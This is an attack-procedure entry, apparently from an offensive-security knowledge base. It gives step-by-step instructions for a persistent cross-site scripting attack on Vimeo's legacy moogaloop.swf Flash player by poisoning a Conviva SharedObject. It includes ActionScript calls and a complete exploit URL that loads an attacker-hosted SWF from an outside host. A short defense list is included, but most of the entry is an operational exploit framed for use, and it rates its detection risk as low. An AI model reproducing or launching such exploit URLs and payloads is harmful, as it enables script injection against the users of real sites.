---
tags:
  - xss
  - flash
  - sharedobject
  - vimeo
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Flash
submitted: true
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: e20c48d6-fb44-4b16-b6ec-5a3e0264e574
created_at: '2025-12-14T03:16:14.580Z'
updated_at: '2025-12-14T03:16:14.580Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Set-Malicious-Flash-SharedObject-via-CDN-URL

## Summary

This procedure exploits the lack of sandboxing in Vimeo's moogaloop.swf Flash player by injecting a malicious cdn_url parameter, allowing a controlled SWF to load in the trusted f.vimeocdn.com domain and modify the Conviva LivePass SharedObject to cache a malicious SWF URL for later JavaScript execution.

## Description

The attack targets the deprecated moogaloop.swf (version 6.0.30), which unsafely includes external SWFs via the cdn_url without domain validation. The injected SWF (e.g., set_shared_con.swf) runs in the f.vimeocdn.com security sandbox and uses ActionScript to write to the local SharedObject 'com.conviva.livePass.lastSwfUrls', redirecting it to an attacker-controlled SWF (e.g., t2.swf). This SWF employs ExternalInterface to call JavaScript like confirm('moin: ' + document.domain). The poisoning persists across sessions until cleared, enabling delayed XSS when the victim loads an embedded player.

## Requirements

1. Web browser with Adobe Flash Player plugin enabled and supporting ExternalInterface
2. Control over a web server to host malicious SWFs (e.g., set_shared_con.swf and t2.swf)
3. Public access to Vimeo CDN (f.vimeocdn.com)
4. Knowledge of URL encoding for the cdn_url parameter

## Defense

Defensive measures and detection strategies:

- Disable Flash Player entirely, as it is deprecated and unsupported since 2020
- Migrate to HTML5 video embeds on Vimeo and other sites to avoid legacy SWF usage
- Implement Content Security Policy (CSP) to block inline scripts and ExternalInterface calls
- Monitor for anomalous Flash loads from CDN domains in browser logs or network traffic

## Objectives

1. Load and execute a malicious SWF in a trusted security domain
2. Poison the SharedObject to cache attacker-controlled content
3. Prepare for cross-domain JavaScript injection via subsequent player loads

## Instructions

### Step 1: Prepare Malicious SWFs

**Context**: Host two SWFs on your server: one to set the SharedObject (set_shared_con.swf) and one to execute JS (t2.swf). The setter SWF uses ActionScript to write SharedObject.getLocal('com.conviva.livePass').setProperty('lastSwfUrls', 'http://yourserver/t2.swf'); while t2.swf calls ExternalInterface.call('confirm', 'moin: ' + document.domain).

No command needed; compile SWFs using Adobe Flash tools or online compilers.

### Step 2: Craft and Access Poisoning URL

**Context**: Encode the malicious SWF URL in the cdn_url parameter and load moogaloop.swf to trigger inclusion.

Access via browser:

```url
http://f.vimeocdn.com/p/flash/moogaloop/6.0.30/moogaloop.swf?cdn_url=https://batr.am/exmp/v/10ece191bd6f4806ed0e7a165931a890a47ea250//set_shared_con.swf%3f
```

> The %3f at the end ensures proper URL parsing. The SWF loads, sets the SharedObject, and may trigger a confirm dialog if t2.swf executes immediately.

**Expected Output**: Flash content loads without errors; SharedObject is modified (verifiable via Flash debugging tools like Flare or browser storage inspection).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[flash]]
- [[sharedobject]]
- [[vimeo]]
